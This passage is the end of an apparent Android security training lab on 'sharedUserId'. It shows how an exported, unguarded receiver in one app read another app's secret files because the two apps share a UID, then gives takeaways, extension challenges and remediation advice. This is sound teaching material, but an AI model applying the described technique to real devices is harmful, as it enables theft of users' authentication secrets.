> the operating system's file-permission and SELinux checks cannot distinguish them.
>
> Consequence: any code execution, arbitrary file read, or injection flaw in `com.meridian.companion`
> is equivalent to the same flaw in `com.meridian.vault`. This was demonstrated by sending an
> unauthenticated broadcast to the exported, unguarded receiver
> `com.meridian.companion/.ExfilReceiver`, which read
> `/data/user/0/com.meridian.vault/files/vault/secret.bin` and
> `/data/user/0/com.meridian.vault/shared_prefs/vault_state.xml`, allowing recovery of the customer
> authentication secret. No root access, no `run-as`, and no modification of either APK was required.
>
> `android:sharedUserId` is deprecated as of API 29. Remediation requires
> `android:sharedUserMaxSdkVersion` for new installs plus a data-migration plan for existing users;
> see the detail above.

---

## What you learned

- **`sharedUserId` is not a convenience feature with a security caveat. It is a security decision.**
  It merges two applications into one operating-system principal, permanently, at build time.
- **The kernel's DAC check is the primary sandbox, and it is keyed on a number.** Nothing in the
  framework was bypassed in this lab. The check ran and passed, because the identity really was
  shared.
- **SELinux does not save you here** — its categories are derived from the same appId, so the
  second, independent isolation layer collapses onto the first.
- **Blast radius is a design property.** The Vault was written well. It was compromised by a
  contractor's receiver in a different APK, because the two were the same UID. When you scope an
  assessment, enumerate shared users *first* and pull the whole group into scope.
- **Deprecation is not removal.** `sharedUserId` is deprecated, still supported, still present in
  large amounts of shipped enterprise and OEM software, and cannot be removed from an installed app
  without destroying user data. You will meet it in the field for years.
- **`sharedUserMaxSdkVersion` is a forward-looking mitigation only.** Knowing exactly which installs
  it affects — and which it does not — is the difference between a useful recommendation and a
  misleading one.

---

## Extension challenges

1. **Reverse the direction.** Make the Vault read the Companion's data. Confirm that shared identity
   is symmetric.
2. **Same process, not just same UID.** Add `android:process="com.meridian.shared.core"` to a
   component in each app and confirm with `ps` that they land in one process — then reason about what
   an attacker gains from a shared ART heap that they did not already have from a shared UID.
3. **Permission union.** Give the Companion `android.permission.CAMERA` and grant it at runtime.
   Inspect `dumpsys package com.meridian.vault | grep -A 20 'runtime permissions'` and
   `/proc/<vault pid>/status` `Groups:`. Work out precisely which permission state is per-package and
   which is per-shared-user on your Android version, and write the version matrix.
4. **Detection.** Write a script that flags every third-party shared-UID group on an arbitrary device,
   excluding the platform's own `android.uid.*` groups. Compare your result with
   [`../scripts/uid-map.py`](../scripts/uid-map.py).
5. **Uninstall semantics.** Uninstall only the Companion. Does the shared user survive? What happens
   to appId 10234? Does reinstalling the Companion get the same UID back? Explain why, using
   `packages.xml`.

---

## Next

- [`../faq.md`](../faq.md) — questions 4, 5 and 21 cover this ground from other angles.
- [`../../21-App-Sandbox/README.md`](../../21-App-Sandbox/README.md) — the enforcement you just
  walked around.
- [`../../22-SELinux/README.md`](../../22-SELinux/README.md) — why the MLS categories matched.
- [`../../32-Manifest/README.md`](../../32-Manifest/README.md) — every other attribute with this much
  power.
- [`../../72-RealWorldFindings/README.md`](../../72-RealWorldFindings/README.md) — how this finding is
  written up for a client.
